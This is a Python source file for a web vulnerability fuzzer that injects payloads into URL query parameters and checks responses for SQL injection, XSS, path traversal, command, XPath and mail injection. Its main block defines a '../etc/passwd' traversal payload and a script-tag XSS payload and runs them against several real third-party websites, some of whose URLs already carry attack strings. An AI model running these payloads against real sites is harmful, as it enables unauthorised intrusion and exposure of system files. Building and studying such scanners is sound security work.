import sys
from massweb.targets.target import Target
from massweb.targets.fuzzy_target import FuzzyTarget
from massweb.fuzzers.ifuzzer import iFuzzer
from massweb.fuzz_generators.url_generator import generate_fuzzy_urls
from massweb.mass_requests.mass_request import MassRequest
from massweb.payloads.payload import Payload
from urlparse import parse_qs
from urlparse import urlparse
from urlparse import urlunparse
from urllib import urlencode
from massweb.vuln_checks.mxi import MXICheck
from massweb.vuln_checks.osci import OSCICheck
from massweb.vuln_checks.sqli import SQLICheck
from massweb.vuln_checks.trav import TravCheck
from massweb.vuln_checks.xpathi import XPathICheck
from massweb.vuln_checks.xss import XSSCheck
from massweb.results.result import Result

class GetFuzzer(iFuzzer):

    def __init__(self, targets = [], payloads = [], num_threads = 10, time_per_url = 10, request_timeout = 10, proxy_list = [{}]):

        self.mreq = MassRequest(num_threads = num_threads, time_per_url = time_per_url, request_timeout = request_timeout, proxy_list = proxy_list)
        self.targets = targets
        self.payloads = payloads

        self.mxi_check = MXICheck()
        self.osci_check = OSCICheck()
        self.sqli_check = SQLICheck()
        self.trav_check = TravCheck()
        self.xpathi_check = XPathICheck()
        self.xss_check = XSSCheck()

    def __replace_param_value(self, url, param, replacement_string):
        '''Replace a parameter in a url with another string. Returns
        a fully reassembled url as a string.'''

        url_parsed = urlparse(url)
        query_dic = parse_qs(url_parsed.query)
        query_dic[param] = replacement_string

        #this incidentally will also automatically url-encode the payload (thanks urlencode!)
        query_reassembled = urlencode(query_dic, doseq = True)

        #3rd element is always the query, replace query with our own
        url_list_parsed = list(url_parsed)
        url_list_parsed[4] = query_reassembled
        url_parsed_q_replaced = tuple(url_list_parsed)
        url_reassembled = urlunparse(url_parsed_q_replaced)

        return url_reassembled

    def __generate_fuzzy_target(self, target):

        url = target.url
        parsed_url = urlparse(url)
        parsed_url_query = parsed_url.query
        url_q_dic = parse_qs(parsed_url_query)

        fuzzy_targets = []
        for query_param, query_val in url_q_dic.iteritems():

            for payload in self.payloads:

                fuzzy_url = (self.__replace_param_value(url, query_param, str(payload)))
                fuzzy_target = FuzzyTarget(fuzzy_url, "get", payload)
                fuzzy_targets.append(fuzzy_target)

        return fuzzy_targets

    def generate_fuzzy_targets(self):

        if len(self.targets) == 0:
            raise Exception("Targets list must not be empty!")

        fuzzy_targets = []
        for target in self.targets:

            fuzzy_target_list = self.__generate_fuzzy_target(target)
            fuzzy_targets += fuzzy_target_list
            
        return fuzzy_targets

    def fuzz(self):

        fuzzy_targets = self.generate_fuzzy_targets()
        self.mreq.get_fuzzy_targets(fuzzy_targets)
        results = []
        for r in self.mreq.targets_results:
            ftarget = r[0]
            #print ftarget, r[1][0:100], ftarget.payload.check_type_list
            #!not yet multithreaded, should it be?
            result = self.analyze_response(ftarget, r[1])
            results.append(result)

        return results

    def analyze_response(self, ftarget, response):

        result_dic = {}
        check_type_list = ftarget.payload.check_type_list
        if "mxi" in check_type_list:
            mxi_result = self.mxi_check.check(response)
            result_dic["mxi"] = mxi_result

        if "sqli" in check_type_list:
            sqli_result = self.sqli_check.check(response)
            result_dic["sqli"] = sqli_result

        if "xpathi" in check_type_list:
            xpathi_result = self.xpathi_check.check(response)
            result_dic["xpathi"] = xpathi_result

        if "trav" in check_type_list:
            trav_result = self.trav_check.check(response)
            result_dic["trav"] = trav_result

        if "osci" in check_type_list:
            osci_result = self.osci_check.check(response)
            result_dic["osci"] = osci_result

        if "xss" in check_type_list:
            xss_result = self.xss_check.check(response)
            result_dic["xss"] = xss_result

        return Result(ftarget, result_dic)

if __name__ == "__main__":

    gf = GetFuzzer(proxy_list = [{}])
    mx_sqli_xmli_trav_osci_payload = Payload("../../../../../../../../../../../../../../../../../../../../etc/passwd#--'@!\\"
                                             , check_type_list = ["mxi", "sqli", "xpathi", "trav", "osci"])

    xss_payload = Payload('"><ScRipT>alert(31337)</ScrIpT>', check_type_list = ["xss"])

    gf.add_payload(mx_sqli_xmli_trav_osci_payload)
    gf.add_payload(xss_payload)

    gf.add_target_from_url("http://www.hyperiongray.com/?q=user&t=eke")
    gf.add_target_from_url("http://www.sfgcd.com/ProductsBuy.asp?ProNo=%22%3E%3CSCrIpT%3Ealert%2826702%29%3C%2FScRiPt%3E&amp;ProName=%C2%A2%C3%81%C2%A03%083D%09")
    gf.add_target_from_url("http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;typeofsite=snippetdetail&amp;ID=1368&amp;Sectionid=%27%29")
    gf.add_target_from_url("http://www.dobrevsource.org/index.php?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd")
    gf.fuzz()


#    for t in gf.generate_fuzzy_targets():
#        print t.url
#        print t.payload.check_type_list

#    for res in gf.fuzz():
#        print res
